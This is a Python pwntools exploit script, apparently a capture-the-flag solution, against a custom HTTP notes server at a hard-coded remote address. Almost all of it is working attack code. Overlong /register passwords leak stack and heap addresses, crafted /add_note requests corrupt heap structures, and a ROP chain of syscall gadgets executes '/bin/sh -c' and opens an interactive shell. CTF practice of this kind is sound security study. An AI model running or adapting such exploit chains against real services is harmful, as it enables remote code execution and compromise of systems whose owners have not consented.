from pwn import *
from IPython import *

exe = './main'


(host,port) = ("34.141.69.104",32608)
# (host,port) = ("localhost",1339)


context.arch = "amd64"
def start(argv=[], *a, **kw):
    if args.GDB:
        global host
        global port
       
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.RE:
        return remote(host,port)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * 0x454a40
c
c
c
c
c
c
c
c
c
c
c
c
c
c
'''.format(**locals())

context.terminal = ["gnome-terminal", "--"]

# ====================[EXPANSIONS]=========================

se  = lambda data  : p.send(data)
sl  = lambda data  : p.sendline(data)
sa  = lambda ip,op : p.sendafter(ip,op)
sla = lambda ip,op : p.sendlineafter(ip,op) 
rvu = lambda data  : p.recvuntil(data)
rvl = lambda       : p.recvline()
rv  = lambda nbyts : p.recv(nbyts)  
pop = lambda       : p.interactive()

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>

p = None

def get(payload):
    global p
    p = remote(host,port)
    se(b"GET " + payload)
    time.sleep(0.7)

def post(payload):
    global p
    p = remote(host,port)
    se(b"POST " + payload)
    time.sleep(0.7)

def chain(payload):
    res=b""
    for i in payload:
        res+=(p64(i)).replace(b"\x00",b"0")
    return res.replace(b" ",b"+")

def leak(addr,nbytes):
    payload=b"aaa0".ljust(0x100,b"a") + chain([
    # PRINT_MESSAGES
    addr
    ]) 
    post(b"/register username=sasi&password=" + payload +  b"\x00")
    post(b"/login username=sasi&password=" + b"aaa\x00" + b" \x00")
    get(b"/index.html")

    rvu(b"Content-Type: text/html")
    rvl()
    rvl()
    return u64((rv(nbytes)).ljust(8,b"\x00"))

# GET /
# GET /index.html
# GET /style.css
# GET /register
# POST /login
# POST /register
# GET /notes
# POST /add_note
# POST /delete_note

if(not args.RE):
    r = start()

else:   
    p = start()
    
context.log_level = "DEBUG"
stack = leak(0x4d94b8,7)
print("STACK = ",hex(stack))

heap = leak(0x4d2a20,5)
print("HEAP = ",hex(heap))

payload=(b"aaa0".ljust(0x100,b"a") + chain([
    # PRINT_MESSAGES
    0x4a2008,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,
    # OTHER STUFF
    0x800,0x840,0x380000,0x1c0000,0x8000,0x4000,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8 , 0x0 ]) +
    # HEAP STRUCT OVERWRITE 
    chain([ 0x0 , 0x20000 ]).ljust(0x650,b"a") +
    chain([ heap , 0x40 , 0x408, 0x7 ]) + 
    chain([ 0x0 for i in range(0x80//0x8) ]) + 
    chain([ 0x4d23d0 ]))

post(b"/register username=sasi&password=" + payload +  b"\x00")
post(b"/login username=sasi&password=" + b"aaa\x00" + b" \x00")

payload=(0x18*b"a" + b"&" + b"\x00").ljust(0xfe4,b"a") 
post(b"/add_note note_content=" + payload)

payload=(0x18*b"a" + b"&" + b"\x00").ljust(0xfe4,b"a") 
post(b"/add_note note_content=" + payload)

poprdi    = 0x402c8f
poprbxrdx = 0x4898eb
poprsi    = 0x40acfe
poprax    = 0x452a17
syscal    = 0x415d76
socket    = 0x454a40

def syscall(rax,rdi,rsi,rdx):
    return [poprdi , rdi ,
             poprbxrdx , rdx , 0x0 , 
             poprsi , rsi , 
             poprax , rax , syscal ]

ropchain = [ poprdi , 0x3 , poprsi , stack - 0x218 , poprbxrdx , stack - 0x21c , 0x0 , socket ] + syscall(0x0,0x5,0x4d22b8,0x100) 

payload=((b"aaa0aaaa" + chain(ropchain)).ljust(0xf8,b"a") + b"/bin/sh0" + chain([
    # PRINT_MESSAGES
    0x4a2008,0x4d2400,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8,
    # OTHER STUFF
    0x800,0x840,0x380000,0x1c0000,0x8000,0x4000,0x4d23c8,0x4d23c8,0x4d23c8,0x4d23c8 , 0x0 ]) +
    # HEAP STRUCT OVERWRITE 
    chain([ 0x0 , 0x20000, stack - 0x1270 , stack - 0x270 + (0x9e5) , 0x0]).ljust(0x650,b"a") +
    chain([ heap , 0x40 , 0x408, 0x7 ]) + 
    chain([ 0x0 for i in range(0x80//0x8) ]) + 
    chain([ 0x4d23d0 ]))

post(b"/register username=sasi&password=" + payload +  b"\x00")
post(b"/login username=sasi&password=" + b"aaa\x00" + b" \x00")

payload=chain([0x10 for i in range(0x9e5//0x8)])[:-3:] + chain([0x4d2220])
get(b"/notes\x00" + payload)

payload = flat([ poprdi , 0x4d2328 , poprsi , 0x4d2308 , poprbxrdx , 0x0 ,  0X0 , poprax , 0x3b, syscal , 0x4d2328 , 0x4d2330 , 0x4d2333 , 0x0 ]) + b"/bin/sh\x00" + b"-c\x00" + b"echo hehe >&5\x00" 
p = remote(host,port)
se(payload)

pop()

